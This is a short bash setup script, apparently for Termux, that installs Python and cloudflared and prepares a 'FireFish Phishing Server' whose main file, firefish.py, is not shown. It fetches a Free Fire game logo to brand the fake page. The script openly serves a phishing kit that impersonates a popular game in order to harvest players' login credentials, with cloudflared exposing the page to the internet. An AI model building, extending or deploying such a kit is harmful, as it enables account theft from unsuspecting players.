#!/bin/bash
echo "🔥 Setting up FireFish Phishing Server..."

# Install dependencies
pkg update -y
pkg install python -y
pip install cloudflared

# Create directories
mkdir -p static

# Make executable
chmod +x firefish.py install.sh

# Download Free Fire logo (optional)
wget -O static/images.jpeg "https://example.com/freefire-logo.jpg" || echo "Logo download skipped"

echo "✅ Setup complete!"
echo "Run: python firefish.py"
